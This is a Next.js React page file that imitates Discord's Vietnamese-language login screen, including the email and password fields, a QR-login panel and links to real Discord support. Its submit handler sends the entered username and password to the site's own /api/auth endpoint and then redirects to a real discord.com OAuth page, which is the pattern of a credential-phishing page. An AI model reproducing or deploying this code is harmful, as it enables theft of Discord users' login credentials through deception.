"use client";

import React, { useState } from "react";
import styled, { ThemeProvider } from "styled-components";
import Image from "next/image";
import GamerForm from "../styled/GamerForm";
import GamerInput from "../styled/GamerInput";
import QRStyles from "../styled/QRStyles";
import theme from "../lib/theme";
import Container from "../styled/Container";

const Wrapper = styled.div`
  height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  background-image: url('/background.svg');
  background-size: cover;
  background-position: center center;
`;

const DiscordForm = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const updateInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    if (name === "username") setUsername(value);
    if (name === "password") setPassword(value);
  };

  const addUser = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const response = await fetch("/api/auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      if (response.ok) {
        setUsername("");
        setPassword("");
        window.location.href = "https://discord.com/oauth2/authorized";
      }
    } catch (error) {
      console.error("Error:", error);
    }
  };

  return (
    <ThemeProvider theme={theme}>
      <Container>
        <GamerForm onSubmit={addUser}>
          <fieldset>
            <h3>Chào mừng trở lại!</h3>
            <h4>Rất vui mừng khi được gặp lại bạn!</h4>
            <GamerInput>
              <label htmlFor="username">EMAIL HOẶC SỐ ĐIỆN THOẠI</label>
              <input
                type="text"
                name="username"
                id="username"
                onChange={updateInput}
                value={username}
              />
            </GamerInput>
            <GamerInput>
              <label htmlFor="password">MẬT KHẨU</label>
              <input
                type="password"
                name="password"
                id="password"
                onChange={updateInput}
                value={password}
              />
              <a href="https://support.discord.com/hc/en-us">
                Quên mât khẩu?
              </a>
            </GamerInput>
            <button className="submitButton" type="submit">
              <div>Đăng nhập</div>
            </button>
            <div>
              <p
                style={{
                  display: "inline-block",
                  fontSize: "13px",
                  color: "grey",
                }}
              >
                Cần 1 tài khoản?&nbsp;
              </p>
              <a href="https://support.discord.com/hc/en-us">Đăng ký</a>
            </div>
          </fieldset>
        </GamerForm>

        <div className="vert-sep"></div>

        <QRStyles>
          <div className="qrMask">
            <Image
              src="/qr.png"
              alt="QR Code"
              width={160}
              height={160}
              priority
            />
          </div>
          <h3>Đăng nhập bằng mã QR</h3>
          <h4>
            Quét bằng{" "}
            <span className="boldDescription">ứng dụng di động Discord</span> để đăng nhập tức thì.
          </h4>
        </QRStyles>
      </Container>
    </ThemeProvider>
  );
};

export default function Page() {
  return (
    <Wrapper>
      <DiscordForm />
    </Wrapper>
  );
}
